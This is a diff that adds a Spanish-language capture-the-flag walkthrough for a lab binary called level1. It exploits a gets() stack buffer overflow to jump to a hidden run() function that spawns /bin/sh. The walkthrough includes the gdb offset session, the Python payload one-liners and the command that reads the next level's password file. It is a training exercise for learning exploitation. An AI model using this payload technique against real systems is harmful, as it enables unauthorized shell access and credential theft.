@@ -1,0 +1,55 @@
+1.- Descargamos el binario level1 scp -P4242 level1@MV_IP:./level1 level1
+2.- Analizamos el binario con Ghidra
+3.- Vemos que main tiene la función gets() que es potecialmente peligrosa
+  void main(void) {
+    char local_50 [76];
+  
+    gets(local_50);
+    return;
+  }
+4.- Seguimos revisando y nos encontramos con una función de nombre run que ejecuta una shell
+  void run(void) {
+    fwrite("Good... Wait what?\n",1,0x13,stdout);
+    system("/bin/sh");
+    return;
+  }
+5.- Está función pese a no ser llamada desde el main podemos ejecutar su código por medio 
+de un buffer overflow desde la función gets() del main
+6.- Generamos una cadena con 76 "A" y añadimos "BBBB"
+  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
+7.- Ejecutamos gdb level1
+8.- Continuamos hasta que se detenga el la función gets() del main
+9.- Insertamos la cadena que hemos generado
+10.- Vemos que gdb nos insdica el SIGSEGV
+  [...]
+    (gdb) c
+    Continuing.
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x42424242 in ?? ()
+  [...]
+11.- Comprobamos los registros con info reg
+  [...]
+    ebp            0x41414141	0x41414141
+    esi            0x0	0
+    edi            0x0	0
+    eip            0x42424242	0x42424242
+  [...]
+12.- El tamaño del payload está bien ya que eip está ocupado por 4 0x42 que corresponde a la "B"
+13.- Necesitamos sustituir las "B" por la dirección de la función run para que se ejecute
+14.- Para encontrar la dirección de run() podemos usar Ghidra o gdb
+  - gdb: info functions (mejor antes de hacer start y que no nos muestra las funciones enlazadas)
+    [...]
+      0x08048444  run
+      0x08048480  main
+    [...]
+15.- Generaremos el payload con python
+  - Python2:
+      python -c 'print "A"*76 + "\x44\x84\x04\x08"' > payload
+  - Python3:
+      python -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\x44\x84\x04\x08")' > payload
+16.- Para cargar el payload usaremos:
+  cat payload - | ./level1
+  cat /home/user/level2/.pass
+
